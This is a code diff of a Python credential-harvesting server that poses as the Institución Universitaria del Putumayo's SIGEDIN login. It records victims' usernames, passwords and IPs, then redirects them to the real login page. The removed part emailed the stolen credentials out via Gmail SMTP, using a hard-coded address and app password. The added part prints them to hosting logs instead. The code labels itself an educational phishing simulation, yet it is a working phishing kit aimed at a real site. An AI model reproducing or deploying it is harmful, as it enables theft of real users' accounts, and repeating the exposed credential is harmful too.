@@ -2,48 +2,6 @@ import http.server
 import urllib.parse
 import datetime
 import os
-import smtplib
-import threading
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
-
-# CONFIGURACION PARA NOTIFICACIONES
-CORREO_NOTIFICACION = "marlonmoncayo7474@gmail.com"
-PASSWORD_NOTIFICACION = "jpwy hpdh lnuy tpaw"  # Tu contraseña de aplicación de Gmail
-
-def enviar_alerta_correo(usuario, clave, ip, fecha):
-    print(f"[DEBUG] Intentando enviar correo para el usuario: {usuario}")
-    try:
-        msg = MIMEMultipart("alternative")
-        msg['Subject'] = "🚨 ¡Nuevas credenciales capturadas en SIGEDIN!"
-        msg['From'] = CORREO_NOTIFICACION
-        msg['To'] = CORREO_NOTIFICACION
-
-        cuerpo = f"""
-        <html>
-          <body style="font-family: Arial, sans-serif; color: #1f2937;">
-            <h2 style="color: #d97706;">¡Credenciales capturadas con exito!</h2>
-            <p><strong>Fecha y Hora:</strong> {fecha}</p>
-            <p><strong>IP de la víctima:</strong> {ip}</p>
-            <hr>
-            <p><strong>Usuario / Documento:</strong> <span style="color: #dc2626; font-size: 16px;">{usuario}</span></p>
-            <p><strong>Contraseña capturada:</strong> <span style="color: #dc2626; font-size: 16px;">{clave}</span></p>
-            <hr>
-            <p><em>Simulación educativa de Phishing - Institución Universitaria del Putumayo</em></p>
-          </body>
-        </html>
-        """
-        msg.attach(MIMEText(cuerpo, 'html', 'utf-8'))
-
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.set_debuglevel(1)  # Activa logs detallados de SMTP en la consola de Render
-        server.starttls()
-        server.login(CORREO_NOTIFICACION, PASSWORD_NOTIFICACION)
-        server.sendmail(CORREO_NOTIFICACION, CORREO_NOTIFICACION, msg.as_string())
-        server.quit()
-        print("[+] Alerta de credenciales enviada por correo exitosamente.")
-    except Exception as e:
-        print(f"[-] ERROR CRITICO al enviar la alerta por correo: {e}")
 
 class PhishingHandler(http.server.SimpleHTTPRequestHandler):
     def end_headers(self):
@@ -60,13 +18,16 @@ class PhishingHandler(http.server.SimpleHTTPRequestHandler):
         ip = self.headers.get('X-Forwarded-For', self.client_address[0])
         fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         
-        print(f"\n[¡ALERTA! CREDENCIALES CAPTURADAS] Usuario: {usuario} | Clave: {clave} | IP: {ip}")
+        # IMPRESIÓN DIRECTA EN LOS LOGS DE RENDER (100% Seguro y visible al instante)
+        print("\n" + "="*60)
+        print(f"🚨 ¡CREDENCIALES CAPTURADAS EXITOSAMENTE! 🚨")
+        print(f"📅 Fecha y Hora: {fecha}")
+        print(f"🌐 IP de la Víctima: {ip}")
+        print(f"👤 Usuario / Documento: {usuario}")
+        print(f"🔑 Contraseña: {clave}")
+        print("="*60 + "\n")
         
-        # Enviar el correo en segundo plano
-        hilo_correo = threading.Thread(target=enviar_alerta_correo, args=(usuario, clave, ip, fecha))
-        hilo_correo.start()
-        
-        # Redirigir de inmediato a la víctima al sitio real
+        # Redirigir de inmediato a la víctima al sitio real de la universidad
         self.send_response(302)
         self.send_header('Location', 'https://sigedin.uniputumayo.edu.co/login')
         self.end_headers()
